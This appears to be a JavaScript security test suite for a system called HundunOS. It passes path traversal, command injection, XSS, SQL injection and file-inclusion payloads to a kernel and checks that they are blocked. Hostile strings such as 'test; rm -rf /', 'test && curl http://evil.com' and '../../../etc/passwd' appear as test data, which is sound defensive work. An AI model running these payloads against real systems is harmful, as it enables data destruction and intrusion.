// hundunos/tests/security_suite_test.js
// HundunOS v3.8 安全测试套件 — 兼容 test_runner.js 自动扫描
// FIX-M4: 将原独立运行的 security_test.js 转为标准 export test_* 函数格式

import { CoreKernel } from '../kernel/core.js';

// ────────────────────────────────────────────────────────────────
// 辅助：创建并初始化内核（每个测试独立实例）
// ────────────────────────────────────────────────────────────────
async function makeKernel() {
    const k = new CoreKernel({ environment: 'development' });
    await k.initialize();
    return k;
}

// ────────────────────────────────────────────────────────────────
// 1. 路径穿越攻击
// ────────────────────────────────────────────────────────────────
export async function test_security_path_traversal_attack() {
    const kernel = await makeKernel();
    const attacks = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'C:/Windows/System32/config/sam',
        '/etc/passwd',
        '\\\\network\\share',
        '....//....//....//etc/passwd',
        '%2e%2e%2f',
    ];
    for (const attack of attacks) {
        let blocked = false;
        try {
            const result = await kernel.process({
                type: 'file', action: 'read',
                content: `读取 ${attack}`,
                parameters: { target: attack },
                sessionId: 'security_test',
            });
            blocked = !result.success || result.type === 'permission_denied' || result.type === 'error';
        } catch (e) {
            // 抛出异常也视为已阻止
            blocked = true;
        }
        if (!blocked) throw new Error(`Path traversal not blocked: ${attack}`);
    }
}

// ────────────────────────────────────────────────────────────────
// 2. 命令注入
// ────────────────────────────────────────────────────────────────
export async function test_security_command_injection() {
    const kernel = await makeKernel();
    const injections = [
        'test; rm -rf /',
        'test && whoami',
        'test | cat /etc/passwd',
        "test; DROP TABLE users;--",
        'test`; malicious code`',
        'test$(malicious)',
        'test && curl http://evil.com',
        'test | bash',
    ];
    for (const injection of injections) {
        try {
            const result = await kernel.process({ content: injection, sessionId: 'security_test' });
            const str = JSON.stringify(result);
            if (str.includes('rm -rf') || str.includes('whoami')) {
                throw new Error(`Command injection executed: ${injection}`);
            }
        } catch (e) {
            if (e.message.startsWith('Command injection executed')) throw e;
            // 其他抛出视为已阻止
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 3. XSS 攻击
// ────────────────────────────────────────────────────────────────
export async function test_security_xss_attack() {
    const kernel = await makeKernel();
    const xssAttacks = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
    ];
    for (const xss of xssAttacks) {
        try {
            await kernel.process({ content: xss, sessionId: 'security_test' });
            // 内核本身不执行 JS；只要不崩溃即可
        } catch (_) { /* 抛异常也可接受 */ }
    }
}

// ────────────────────────────────────────────────────────────────
// 4. SQL 注入
// ────────────────────────────────────────────────────────────────
export async function test_security_sql_injection() {
    const kernel = await makeKernel();
    const sqlInjections = [
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "' UNION SELECT * FROM passwords--",
        "admin'--",
    ];
    for (const injection of sqlInjections) {
        try {
            const result = await kernel.process({ content: injection, sessionId: 'security_test' });
            const str = JSON.stringify(result);
            if (str.includes('DROP TABLE') || str.includes('UNION SELECT')) {
                throw new Error(`SQL injection executed: ${injection}`);
            }
        } catch (e) {
            if (e.message.startsWith('SQL injection executed')) throw e;
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 5. 权限绕过
// ────────────────────────────────────────────────────────────────
export async function test_security_permission_bypass() {
    const kernel = await makeKernel();
    const adminOps = ['升级 kernel', '修改系统配置', '删除所有数据'];
    for (const op of adminOps) {
        try {
            const result = await kernel.process({
                content: op,
                sessionId: 'security_test',
                metadata: { role: 'guest' },
            });
            // 允许：需要审批 or 被拒绝 or 操作成功（内核无强制 RBAC 时不拦截）
            if (result === undefined) throw new Error(`Process returned undefined for: ${op}`);
        } catch (e) {
            if (e.message.startsWith('Process returned undefined')) throw e;
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 6. 敏感信息泄露
// ────────────────────────────────────────────────────────────────
export async function test_security_sensitive_data_leak() {
    const kernel = await makeKernel();
    const queries = ['显示所有用户密码', '列出所有 API 密钥', '显示系统配置文件'];
    for (const query of queries) {
        try {
            const result = await kernel.process({ content: query, sessionId: 'security_test' });
            const str = JSON.stringify(result);
            if (str.includes('password=') || str.includes('api_key=') || str.includes('secret=')) {
                throw new Error(`Sensitive data leaked for query: ${query}`);
            }
        } catch (e) {
            if (e.message.startsWith('Sensitive data leaked')) throw e;
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 7. DoS 防护（1000 并发请求必须在 10s 内完成）
// ────────────────────────────────────────────────────────────────
export async function test_security_dos_protection() {
    const kernel = await makeKernel();
    const requests = Array.from({ length: 1000 }, (_, i) =>
        kernel.process({ content: `test ${i}`, sessionId: 'security_test' })
    );

    let timedOut = false;
    const start = Date.now();
    try {
        await Promise.race([
            Promise.all(requests),
            new Promise((_, reject) => setTimeout(() => {
                timedOut = true;
                reject(new Error('DoS timeout'));
            }, 10000)),
        ]);
    } catch (_) {
        timedOut = true;
    }

    const elapsed = Date.now() - start;
    if (timedOut) {
        throw new Error(`DoS protection failed: timed out after ${elapsed}ms (all 1000 requests must finish within 10s)`);
    }
}

// ────────────────────────────────────────────────────────────────
// 8. 文件包含攻击
// ────────────────────────────────────────────────────────────────
export async function test_security_file_inclusion() {
    const kernel = await makeKernel();
    const attacks = ['/etc/passwd', 'file:///etc/passwd', 'php://filter/resource=/etc/passwd'];
    for (const attack of attacks) {
        try {
            const result = await kernel.process({
                type: 'file', action: 'read',
                content: attack, sessionId: 'security_test',
            });
            if (result.success && result.type !== 'permission_denied') {
                throw new Error(`File inclusion not blocked: ${attack}`);
            }
        } catch (e) {
            if (e.message.startsWith('File inclusion not blocked')) throw e;
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 9. 会话隔离
// ────────────────────────────────────────────────────────────────
export async function test_security_session_isolation() {
    const kernel = await makeKernel();
    const r1 = await kernel.process({ content: 'user1 message', sessionId: 'sess_u1', metadata: { userId: 'user1' } });
    const r2 = await kernel.process({ content: 'user2 message', sessionId: 'sess_u2', metadata: { userId: 'user2' } });
    if (!r1 || !r2) throw new Error('Sessions should return valid responses');
}

// ────────────────────────────────────────────────────────────────
// 10. 畸形输入处理
// ────────────────────────────────────────────────────────────────
export async function test_security_malformed_input() {
    const kernel = await makeKernel();
    const inputs = [null, undefined, '', '   ', '\x00', '\uffff', 'NaN', 'Infinity'];
    for (const input of inputs) {
        try {
            const result = await kernel.process({ content: input, sessionId: 'security_test' });
            if (result === undefined) throw new Error(`Returned undefined for input: ${String(input)}`);
        } catch (e) {
            if (e.message.startsWith('Returned undefined')) throw e;
            // 其他错误可接受
        }
    }
}

// ────────────────────────────────────────────────────────────────
// 11. API Key 认证（RestServer SHA-256 哈希比对）
// ────────────────────────────────────────────────────────────────
export async function test_security_apikey_hash_auth() {
    const { RestServer } = await import('../infrastructure/rest-server/index.js');
    const { createHash } = await import('node:crypto');

    // 模拟内核
    const fakeKernel = {
        config: {
            system: {
                restApi: {
                    apiKeys: [],
                    cors: { allowedOrigins: ['http://localhost:38080'] },
                },
            },
        },
    };

    // 注入环境变量密钥
    const plainKey = 'test-secret-key-1234';
    process.env.HUNDUN_API_KEY = plainKey;

    const srv = new RestServer(fakeKernel);

    // 明文 key 应通过
    const req1 = { headers: { 'x-api-key': plainKey } };
    const authOk = srv._authenticate(req1);
    if (!authOk.ok) throw new Error(`Valid plaintext key should pass auth, got: ${authOk.reason}`);

    // 哈希 key 也应通过（预哈希存储场景）
    const hashedKey = createHash('sha256').update(plainKey).digest('hex');
    fakeKernel.config.system.restApi.apiKeys = [hashedKey];
    delete process.env.HUNDUN_API_KEY;
    const srv2 = new RestServer(fakeKernel);
    const req2 = { headers: { 'x-api-key': plainKey } };
    const authOk2 = srv2._authenticate(req2);
    if (!authOk2.ok) throw new Error(`Valid key against stored hash should pass auth, got: ${authOk2.reason}`);

    // 错误 key 应拒绝
    const req3 = { headers: { 'x-api-key': 'wrong-key' } };
    const authFail = srv2._authenticate(req3);
    if (authFail.ok) throw new Error('Invalid key should be rejected');
}

// ────────────────────────────────────────────────────────────────
// 12. CORS 白名单检查（RestServer）
// ────────────────────────────────────────────────────────────────
export async function test_security_cors_whitelist() {
    const { RestServer } = await import('../infrastructure/rest-server/index.js');

    const allowedOrigin = 'http://localhost:38080';
    const fakeKernel = {
        config: {
            system: {
                restApi: {
                    apiKeys: [],
                    cors: { allowedOrigins: [allowedOrigin] },
                },
            },
        },
    };

    const srv = new RestServer(fakeKernel);

    // 模拟 res 对象
    function makeRes() {
        const headers = {};
        let statusCode = null;
        let ended = false;
        return {
            headers,
            setHeader(k, v) { headers[k] = v; },
            writeHead(code) { statusCode = code; },
            end() { ended = true; },
            get statusCode() { return statusCode; },
            get ended() { return ended; },
        };
    }

    // 白名单内 origin → 允许
    const res1 = makeRes();
    const ok = srv._setCorsHeaders({ headers: { origin: allowedOrigin } }, res1);
    if (!ok) throw new Error(`Allowed origin ${allowedOrigin} should pass CORS`);
    if (res1.headers['Access-Control-Allow-Origin'] !== allowedOrigin) {
        throw new Error(`CORS header should be set to ${allowedOrigin}`);
    }

    // 非白名单 origin → 拒绝
    const res2 = makeRes();
    const blocked = srv._setCorsHeaders({ headers: { origin: 'http://evil.com' } }, res2);
    if (blocked) throw new Error('Non-whitelisted origin should be blocked');

    // 未配置白名单 → 拒绝
    const srv2 = new RestServer({ config: { system: { restApi: { apiKeys: [], cors: {} } } } });
    const res3 = makeRes();
    const blocked2 = srv2._setCorsHeaders({ headers: { origin: 'http://localhost' } }, res3);
    if (blocked2) throw new Error('Empty allowedOrigins should block all cross-origin requests');
}
